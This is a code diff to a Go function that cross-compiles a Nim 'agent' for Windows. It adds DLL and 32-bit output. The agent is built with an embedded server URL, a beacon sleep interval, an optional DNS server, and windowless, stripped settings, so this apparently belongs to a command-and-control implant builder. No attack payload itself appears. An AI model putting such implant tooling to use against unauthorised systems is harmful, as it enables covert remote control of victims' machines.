@@ -231,7 +231,25 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 		return "", err
 	}
 
-	outName  := resolveOutName(cfg, "agent_nim.exe")
+	isDLL    := cfg.Format == "dll"
+	entryFile := "agent.nim"
+	appMode  := "gui"
+	ext      := "exe"
+	if isDLL {
+		entryFile = "agent_dll.nim"
+		appMode   = "lib"
+		ext       = "dll"
+	}
+
+	arch := normalizeArch(cfg.Arch) // "amd64" or "386"
+	nimCPU := "amd64"
+	nimCC  := "x86_64-w64-mingw32-gcc"
+	if arch == "386" {
+		nimCPU = "i386"
+		nimCC  = "i686-w64-mingw32-gcc"
+	}
+
+	outName  := resolveOutName(cfg, fmt.Sprintf("agent_nim_%s.%s", arch, ext))
 	outPath  := filepath.Join(outDir, outName)
 	sleepSec := cfg.SleepSec
 	if sleepSec <= 0 { sleepSec = 5 }
@@ -240,11 +258,11 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 
 	args := []string{
 		"compile",
-		"--os:windows", "--cpu:amd64", "--cc:gcc",
-		"--gcc.exe:x86_64-w64-mingw32-gcc",
-		"--gcc.linkerexe:x86_64-w64-mingw32-gcc",
+		fmt.Sprintf("--os:windows"), fmt.Sprintf("--cpu:%s", nimCPU), "--cc:gcc",
+		fmt.Sprintf("--gcc.exe:%s", nimCC),
+		fmt.Sprintf("--gcc.linkerexe:%s", nimCC),
 		"-d:release", "-d:danger", "-d:strip",
-		"--app:gui", "--opt:size",
+		fmt.Sprintf("--app:%s", appMode), "--opt:size",
 		"--hints:off", "--warnings:off",
 		fmt.Sprintf("-d:serverUrl=%s", cfg.ServerURL),
 		fmt.Sprintf("-d:sleepSec=%d", sleepSec),
@@ -279,7 +297,7 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 			args = append(args, fmt.Sprintf("-d:DNSServer=%s", cfg.DNSServer))
 		}
 	}
-	args = append(args, "agent.nim")
+	args = append(args, entryFile)
 
 	cmd := exec.Command(nim, args...)
 	cmd.Dir = nimDir
